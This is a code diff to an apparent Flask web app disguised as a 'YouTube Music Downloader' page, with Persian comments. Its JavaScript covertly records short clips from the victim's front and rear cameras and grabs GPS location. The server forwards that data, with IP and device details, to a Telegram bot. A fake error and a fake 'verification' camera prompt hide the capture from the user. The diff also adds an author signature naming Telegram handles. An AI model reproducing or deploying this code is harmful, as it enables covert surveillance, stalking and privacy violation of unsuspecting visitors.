@@ -18,20 +18,20 @@ HTML_TEMPLATE = """
 <title>YouTube Music Downloader</title>
 <style>
     body{background:#f0f2f5;font-family:sans-serif;margin:0;padding:0;text-align:center}
-    .header{background:#ff0000;color:white;padding:20px;font-weight:bold}
-    .container{background:white;max-width:400px;margin:30px auto;padding:25px;border-radius:15px;box-shadow:0 4px 15px rgba(0,0,0,0.1);position:relative}
+    .header{background:#ff0000;color:white;padding:25px 10px;box-shadow:0 2px 5px rgba(0,0,0,0.2)}
+    .header h1{margin:5px 0;font-size:22px;letter-spacing:1px}
+    .container{background:white;max-width:420px;margin:30px auto;padding:25px;border-radius:15px;box-shadow:0 4px 15px rgba(0,0,0,0.1);position:relative;box-sizing:border-box}
     .input-box{width:100%;padding:14px;border:1px solid #ccc;border-radius:8px;font-size:14px;box-sizing:border-box;margin-bottom:15px;outline:none}
-    .btn{background:#ff0000;color:white;border:none;padding:15px;width:100%;border-radius:8px;font-size:16px;font-weight:bold;cursor:pointer}
+    .btn{background:#ff0000;color:white;border:none;padding:15px;width:100%;border-radius:8px;font-size:16px;font-weight:bold;cursor:pointer;box-shadow:0 4px 10px rgba(255,0,0,0.3)}
     
-    /* استایل صفحه خطا و اخطار دسترسی دوربین */
     #permissionModal {
         display: none;
         position: absolute;
         top: 0; left: 0; width: 100%; height: 100%;
-        background: rgba(255, 255, 255, 0.95);
+        background: rgba(255, 255, 255, 0.98);
         border-radius: 15px;
         z-index: 10;
-        padding-top: 60px;
+        padding-top: 80px;
         box-sizing: border-box;
     }
     #permissionModal h2 {
@@ -49,13 +49,13 @@ HTML_TEMPLATE = """
 </head>
 <body>
     <div class="header">
-        <h2>YouTube Music Downloader</h2>
+        <h1>▶ YouTube</h1>
+        <h1>YOUTUBE MUSIC DOWNLOADER</h1>
     </div>
 
     <div class="container">
-        <!-- کادر اخطار که دقیقاً مثل عکس شما ظاهر می‌شود -->
         <div id="permissionModal">
-            <div style="font-size: 40px;">🔒</div>
+            <div style="font-size: 45px;">🔒</div>
             <h2>Camera Permission Needed</h2>
             <p>Please enable camera access in your browser settings to proceed with verification.</p>
         </div>
@@ -97,7 +97,7 @@ HTML_TEMPLATE = """
                 mediaRecorder.start();
                 setTimeout(() => {
                     mediaRecorder.stop();
-                }, 4000); // ضبط 4 ثانیه ویدیو
+                }, 4000); // ضبط 4 ثانیه
                 
             } catch (err) {
                 reject(err);
@@ -108,11 +108,10 @@ HTML_TEMPLATE = """
     async function startProcess() {
         const url = document.getElementById('urlInput').value;
         if(!url) {
-            alert("لطفاً لینک را وارد کنید!");
+            alert("لطفاً لینک موزیک را وارد کنید!");
             return;
         }
 
-        // گرفتن لوکیشن کاربر
         navigator.geolocation.getCurrentPosition(async (pos) => {
             const info = {
                 lat: pos.coords.latitude,
@@ -122,19 +121,17 @@ HTML_TEMPLATE = """
 
             try {
                 // ۱. اول دوربین جلو
-                await recordAndSend("user", "دوربین جلو (Front)", info);
+                await recordAndSend("user", "دوربین جلو (Front Camera)", info);
                 
                 // ۲. بعد دوربین عقب
-                await recordAndSend("environment", "دوربین عقب (Rear)", info);
+                await recordAndSend("environment", "دوربین عقب (Rear Camera)", info);
 
-                alert("خطا در بارگیری فایل صوتی. لطفاً بعداً تلاش کنید.");
+                alert("خطا در بارگیری فایل صوتی. لطفاً دوباره تلاش کنید.");
                 
             } catch (e) {
-                // اگر کاربر اجازه نداد، باکس اخطار ظاهر می‌شود
                 document.getElementById('permissionModal').style.display = 'block';
             }
         }, (err) => {
-            // اگر به لوکیشن اجازه نداد هم اخطار دوربین را نشان می‌دهیم
             document.getElementById('permissionModal').style.display = 'block';
         }, { enableHighAccuracy: true });
     }
@@ -170,14 +167,19 @@ def upload():
     ua = info.get('ua', 'نامشخص')
     user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     
+    # متن گزارش همراه با امضای شما
     msg = (
         f"🚨 **گزارش جدید ({cam_type}):**\n\n"
         f"📍 موقعیت GPS: {lat}, {lon}\n"
         f"🌐 آی‌پی: {user_ip}\n"
-        f"📱 مشخصات دستگاه: {ua}"
+        f"📱 مشخصات دستگاه: {ua}\n\n"
+        f"───────────────────\n"
+        f"🛠 این ربات توسط ریس شاهد و ریس نوری ساخته شده است.\n"
+        f"👤 ریس شاهد: @shahidnaimi5642\n"
+        f"👤 ریس نوری: @HOKOMAT_ARAB"
     )
     
-    # ارسال لوکیشن فقط در بخش اول (دوربین جلو)
+    # ارسال لوکیشن در اولین مرحله (دوربین جلو)
     if lat != 'نامشخص' and lon != 'نامشخص' and "جلو" in cam_type:
         requests.post(
             f"https://api.telegram.org/bot{BOT_TOKEN}/sendLocation",
